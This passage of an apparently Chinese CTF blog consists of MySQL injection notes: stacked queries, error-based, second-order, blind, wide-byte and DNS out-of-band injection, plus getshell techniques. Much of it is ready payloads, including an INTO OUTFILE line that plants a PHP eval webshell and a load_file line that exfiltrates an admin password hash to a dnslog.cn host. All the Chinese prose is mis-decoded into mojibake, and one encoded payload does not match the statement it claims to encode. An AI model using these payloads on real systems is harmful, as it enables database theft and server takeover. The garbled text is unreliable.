#æ‰“å¼€è¡¨ï¼›è¯»å–ç¬¬ä¸€æ¡æ•°æ®</span><br><span class="line">handler è¡¨å read next;#ä¸ä¸Šä¸€æ¡è¯­å¥ä¸€èµ·ç”¨ï¼Œè¯»å–ä¸‹ä¸€æ¡å³ç¬¬äºŒæ¡æ•°æ®</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">ã€MySQLã€‘MySQL ä¹‹ handler çš„è¯¦ç»†ä½¿ç”¨åŠè¯´æ˜</a></p><h6 id="é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡"><a href="#é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡" class="headerlink" title="é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡"></a>é…åˆé¢„ç¼–è¯‘è¯­å¥ç»•è¿‡</h6><p>ä½¿ç”¨æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @tn = &#x27;hahaha&#x27;;  //å­˜å‚¨è¡¨å</span><br><span class="line">set @sql = concat(&#x27;select * from &#x27;, @tn);  //å­˜å‚¨SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">prepare query from @sql;   //é¢„å®šä¹‰SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">execute query;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥</span><br><span class="line"></span><br><span class="line">(DEALLOCATE || DROP) prepare sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p>[SUCTF 2018]MultiSQL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;;prepare name from @sql;execute name;</span><br></pre></td></tr></table></figure><p>è½¬æ¢è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;&quot;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">c=<span class="string">&#x27;,&#x27;</span>.join(b)</span><br><span class="line">res = <span class="string">&#x27;char(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><h5 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h5><p><strong>ä½¿ç”¨<code>mysql_error()</code>å‡½æ•°ï¼Œå¯ä»¥è¿”å›ä¸Šä¸€ä¸ªMysqlæ“ä½œäº§ç”Ÿçš„æ–‡æœ¬é”™è¯¯ä¿¡æ¯ã€‚</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;wrong_user&quot;</span>,<span class="string">&quot;wrong_pwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;wrong_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">(using password: YES)</span><br></pre></td></tr></table></figure><h5 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h5><p>æœ€å¸¸ç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Xpatè¯­æ³•é”™è¯¯ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œæœ€å¤§é•¿åº¦é™åˆ¶32ä½,é…åˆsubstr()ç­‰æˆªå–å­—ç¬¦ä¸²å‡½æ•°ä½¿ç”¨</span><br><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523184243091.png" alt="image-20230523184243091"></p><p>å…¶ä»–<a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQLæŠ¥é”™æ³¨å…¥ </a></p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŸå‹ï¼š</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+</span><br><span class="line"></span><br><span class="line">çˆ†åº“:</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">çˆ†è¡¨ï¼š</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&#x27;å·²çŸ¥åº“å&#x27;)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çˆ†åˆ—åï¼š</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µå€¼</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+</span><br></pre></td></tr></table></figure><h4 id="äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥</h4><h5 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h5><p><img src="/../images/1.png" alt="ctf1"></p><p>å¸¸è§è½¬ä¹‰å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">mysql_escape_string</span>()</span><br></pre></td></tr></table></figure><p>ä»¥<code>sql-labs Less-24</code>ä¸ºä¾‹</p><p>åˆ›å»ºç”¨æˆ·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸æ°å½“çš„å‡½æ•°<code>mysql_escape_string</code>ï¼ŒåŠŸèƒ½ä¸ºåœ¨ MySQL ä¸­å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼ˆå¦‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’Œç©ºå­—èŠ‚ï¼‰å‰æ·»åŠ åæ–œæ å­—ç¬¦ã€‚æ‰€ä»¥è„æ•°æ®è¿˜æ˜¯è¿›å…¥åˆ°äº†æ•°æ®åº“ä¸­ã€‚</p><p>ä¿®æ”¹å¯†ç å¤„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†è„æ•°æ®å–å‡ºå¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œé€ æˆäº†sqlæ³¨å…¥ã€‚</p><h5 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h5><p>å°†ä¿å­˜çš„è„æ•°æ®ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œå†æ¬¡è¿›è¡Œsqlæ“ä½œçš„åœºæ™¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹è®¢å•ç­‰ä¿®æ”¹å·²ä¿å­˜ä¿¡æ¯çš„åœ°æ–¹</span><br><span class="line">æ³¨å†Œç”¨æˆ·åå¤„</span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><h6 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);<span class="comment">#å¯æ§å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;<span class="comment">#å°†$_POST[&quot;address&quot;]ä¿å­˜åˆ°æ•°æ®åº“ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#$rowä¿å­˜sqlè¯­å¥æŸ¥è¯¢ç»“æœ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];<span class="comment">#è°ƒç”¨äº†æŸ¥è¯¢ç»“æœ</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸Šé¢ä¸¤æ¡è¯­å¥ï¼Œå¯¹å¯æ§å‚æ•°addressåªè¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œå°±ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚</p><p>å¹¶ä¸”åœ¨updateä¸­å¼•ç”¨äº†<code>$row[&#39;address&#39;]</code>ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><p>å¯ä»¥çœ‹åˆ°åˆ—åä¸ºold_addressï¼Œåœ¨è¿›è¡Œä¿®æ”¹æ—¶ï¼Œä¼šå°†æ—§åœ°å€ä¿å­˜ä¸‹æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨ç¬¬ä¸€æ¬¡ä¿®æ”¹æ—¶ï¼Œåœ¨addresså¤„æ³¨å…¥æ¶æ„ä»£ç ï¼Œç¬¬äºŒæ¬¡ä¿®æ”¹æŸ¥è¯¢æ—§åœ°å€æ—¶å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)# </span><br></pre></td></tr></table></figure><h4 id="ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥"><a href="#ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥" class="headerlink" title="ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥"></a>ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥</h4><p>æ¨èé˜…è¯»ï¼š<a href="https://www.anquanke.com/post/id/266244">https://www.anquanke.com/post/id/266244</a></p><h5 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h5><p>é¡µé¢æ— æ•°æ®å›æ˜¾ï¼Œä½†æ˜¯æœ‰ä¸¤ç§è¿”å›çŠ¶æ€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ # True</span><br><span class="line">?id=1&#x27; and 1=2 --+ # False</span><br></pre></td></tr></table></figure><p>å®é™…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=å­æŸ¥è¯¢ --+  </span><br></pre></td></tr></table></figure><p>å­æŸ¥è¯¢&#x3D;å­—ç¬¦ä¸²æˆªå–+æ¯”è¾ƒ</p><h6 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h6><p><code>and 1=</code></p><table><thead><tr><th align="center">é€»è¾‘è¿æ¥ç¬¦</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">æˆ–</td><td align="center">or ï¼Œ||</td></tr><tr><td align="center">å¼‚æˆ–</td><td align="center">xorï¼Œ^</td></tr><tr><td align="center">æŒ‰ä½ä¸&#x2F;æˆ–</td><td align="center">&amp;ï¼Œ|</td></tr></tbody></table><p>å­—ç¬¦ä¸²æˆªå–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä»startä½ç½®å¼€å§‹,æˆªå–lenä¸ªå­—ç¬¦</span><br><span class="line">substr(string,start,len)</span><br><span class="line">mid(string,start,len)</span><br><span class="line"></span><br><span class="line"># ä»å·¦/å³æˆªå–lenä¸ªå­—ç¬¦</span><br><span class="line">left(string,len)</span><br><span class="line">right(string,len)</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like binary 0x25&#123;&#125;&#123;&#125;25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230505230426015.png" alt="image-20230505230426015"></p><blockquote><p>å› ä¸ºå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥è¦ç”¨<code>binary</code></p><p>BINARYå°†16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p></blockquote><p>è¯­æ³•</p><table><thead><tr><th align="center">like</th><th align="center">æ­£åˆ™</th></tr></thead><tbody><tr><td align="center">_</td><td align="center">.</td></tr><tr><td align="center">%</td><td align="center">.*</td></tr><tr><td align="center">[]</td><td align="center">[]</td></tr><tr><td align="center">[^]</td><td align="center">[^]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp &quot;^a&quot;</span><br><span class="line">regexp &quot;^ab&quot;</span><br></pre></td></tr></table></figure><h5 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h5><p>æ—¶é—´ç›²æ³¨å°±æ˜¯<strong>åœ¨å¸ƒå°”ç›²æ³¨ä¸ŠåŠ äº†å»¶è¿Ÿæ—¶é—´å‡½æ•°sleep()</strong>,ç”¨åœ¨Trueå’ŒFalseå›æ˜¾éš¾ä»¥åŒºåˆ†æ—¶,é€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­å¸ƒå°”é€»è¾‘çš„æ­£ç¡®ä¸å¦ã€‚</p><h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(å¸ƒå°”,A,B)ä¸ä¸‰ç›®è¿ç®—ç¬¦é€»è¾‘ä¸€æ ·,åŠ ä¸Šsleepå‡½æ•°</span><br><span class="line"></span><br><span class="line">sleep(if(å¸ƒå°”,A,B))å¸ƒå°”æ­£ç¡®,å»¶è¿ŸAç§’,å¸ƒå°”é”™è¯¯,å»¶è¿ŸBç§’</span><br><span class="line"></span><br><span class="line">æˆ–è€… if(å¸ƒå°”,1,sleep(x))å¸ƒå°”æ­£ç¡®,æ— å»¶è¿Ÿ,å¸ƒå°”é”™è¯¯,å»¶è¿Ÿxç§’</span><br></pre></td></tr></table></figure><p>![image-20230312232840696](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230312232840696.png)</p><h6 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h6><p>èƒ½é€ æˆå»¶æ—¶æ•ˆæœçš„è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># é€šè¿‡æ‰§è¡Œå¤šæ¬¡å‘½ä»¤å½¢æˆå»¶æ—¶</span><br><span class="line">benchmark(æ‰§è¡Œæ¬¡æ•°,sqlè¯­å¥)</span><br><span class="line"></span><br><span class="line"># æŸ¥è¯¢ä¸€äº›æ•°æ®é‡æ¯”è¾ƒå¤§çš„è¡¨åšç¬›å¡å°”é›†è¿ç®—ï¼Œå¯¼è‡´æŸ¥è¯¢ç¼“æ…¢</span><br><span class="line">select * from tab1 cross join tab2;</span><br><span class="line">select * from tab1,tab2;</span><br></pre></td></tr></table></figure><h5 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h5><p>ç›²æ³¨éƒ½æ˜¯éœ€è¦è„šæœ¬çš„ï¼Œæˆ–è€…ç”¨sqlmap</p><h4 id="DNSå¤–å¸¦æ³¨å…¥"><a href="#DNSå¤–å¸¦æ³¨å…¥" class="headerlink" title="DNSå¤–å¸¦æ³¨å…¥"></a>DNSå¤–å¸¦æ³¨å…¥</h4><p>æ¨èé˜…è¯»ï¼š<a href="https://www.anquanke.com/post/id/98096">Dnslogåœ¨SQLæ³¨å…¥ä¸­çš„å®æˆ˜-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><h5 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a>åŸç†</h5><ol><li><p>MySQL Load_File()å‡½æ•°å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œä½¿ç”¨Dnslogæ¥æ”¶è¯·æ±‚ï¼Œè·å–æ•°æ®ï¼›</p></li><li><p>windowsä¸‹å­˜åœ¨<code>UNCè·¯å¾„</code></p><blockquote><p>UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\xxxx\xx</span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20230425175525555.png" alt="image-20230425175525555"></p><p>   <img src="/../images/image-20230425175452805.png" alt="image-20230425175452805"></p></li></ol><h5 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h5><ul><li>windowsç³»ç»Ÿ</li><li><code>secure_file_priv</code>ä¸ºç©º</li></ul><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> hex(passwd) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.2fzz61.dnslog.cn\\abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Hexç¼–ç çš„ç›®çš„æ˜¯å‡å°‘å¹²æ‰°ï¼ŒåŸŸåæœ‰ä¸€å®šçš„è§„èŒƒï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½å¸¦å…¥</span></span><br><span class="line"><span class="comment">-- \\\\è½¬ä¹‰  â†’  \\</span></span><br></pre></td></tr></table></figure><h4 id="SMBå¤–å¸¦æ³¨å…¥"><a href="#SMBå¤–å¸¦æ³¨å…¥" class="headerlink" title="SMBå¤–å¸¦æ³¨å…¥"></a>SMBå¤–å¸¦æ³¨å…¥</h4><p><a href="http://www.moonslow.com/article/smb_sql_injection">http://www.moonslow.com/article/smb_sql_injection</a></p><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><h5 id="åŸç†-5"><a href="#åŸç†-5" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>From:<a href="https://cloud.tencent.com/developer/article/1938545">https://cloud.tencent.com/developer/article/1938545</a></p><p>å®½å­—èŠ‚ï¼šå¦‚æœä¸€ä¸ªå­—ç¬¦çš„å¤§å°æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„ï¼Œè¯¥å­—ç¬¦ç§°ä¸ºå®½å­—èŠ‚å­—ç¬¦</p><p><code>PHP</code>ä¸<code>Mysql</code>ä¹‹é—´çš„äº¤äº’</p><p><img src="/../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p><p>å°†phpçš„sqlè¯­å¥ä»¥<code>character_set_client</code>ç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬ä¸º16è¿›åˆ¶æ•°ï¼‰ï¼Œå†å°†16è¿›åˆ¶æ•°ä»¥<code>character_set_connection</code>è¿›è¡Œç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬æ¢ä¸ºurlç¼–ç ï¼‰ï¼Œç„¶åä»¥å†…éƒ¨æ“ä½œå­—ç¬¦é›†è¿›è¡Œurlè§£ç ï¼Œæœ€åä»¥<code>character_set_results</code>ç¼–ç è¾“å‡ºç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%df%<span class="number">27</span> æµè§ˆå™¨urlè‡ªåŠ¨è§£ç ===&gt; Î²<span class="string">&#x27; è½¬ä¹‰===&gt;Î²\&#x27;è½¬ä¸º16è¿›åˆ¶===&gt; 0xdf0x5c0x27 è½¬æ¢ä¸ºurlç¼–ç ===&gt; %df%5c%27 è¿›è¡Œurlè§£ç (å› ä¸ºæ˜¯GBKç¼–ç ï¼Œ%dfå’Œ%5cç»“åˆä¸ºæ±‰å­—)===&gt; é‹&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜-2"><a href="#ä¾‹é¢˜-2" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p><code>sql-lab less-32</code></p><p>è½¬ä¹‰å­—ç¬¦</p><p><img src="/../images/image-20230522170722857.png" alt="image-20230522170722857"></p><p>è®¾ç½®ç¼–ç é›†</p><p><img src="/../images/image-20230522170750335.png" alt="image-20230522170750335"></p><p>sqlè¯­å¥ï¼Œå•å¼•å·é—­åˆ</p><p><img src="/../images/image-20230522171701503.png" alt="image-20230522171701503"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171728569.png" alt="image-20230522171728569"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171841053.png" alt="image-20230522171841053"></p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Linux è‡ªå¸¦çš„ iconv å‘½ä»¤è¿›è¡Œ UTF çš„ç¼–ç è½¬æ¢</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121013028.png" alt="image-20230523121013028"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1ï¿½&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121159948.png" alt="image-20230523121159948"></p><h4 id="order-by-æ³¨å…¥"><a href="#order-by-æ³¨å…¥" class="headerlink" title="order by æ³¨å…¥"></a>order by æ³¨å…¥</h4><p><a href="https://www.cnblogs.com/1ink/p/15107674.html">https://www.cnblogs.com/1ink/p/15107674.html</a></p><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><h5 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h5><h6 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h6><ul><li><p>é«˜æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user, file_priv from mysql.user; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210141344.png" alt="image-20230528210141344"></p></li><li><p>çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p></li><li><p><code>secure_fil_priv</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;; # showè¯­å¥è¦å †å æ³¨å…¥å’Œå›æ˜¾</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230522174929267.png" alt="image-20230522174929267"></p><h6 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h6><p><strong>åŸºäºè”åˆæŸ¥è¯¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into  dumpfile &#x27;C:\info2.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>outfile</code>å’Œ<code>dumpfile</code>çš„åŒºåˆ«</p><ul><li><code>outfile</code>å¯¼å‡ºæ•°æ®æ”¯æŒå¤šè¡Œï¼Œ<code>dumpfile</code>åªæ”¯æŒä¸€è¡Œ</li><li><code>outfile</code>ä¼šå¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œ<code>dumpfile</code>ä¸ä¼š</li></ul><p>æ‰€ä»¥ä½¿ç”¨<code>into dumpfile</code>è¿™ä¸ªå‡½æ•°æ¥å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="/../images/image-20230522180009679.png" alt="image-20230522180009679"></p><p><strong>éè”åˆæŸ¥è¯¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 into outfile &#x27;C:\info.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 into outfile &#x27;C:\info2.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522180543767.png" alt="image-20230522180543767"></p><h5 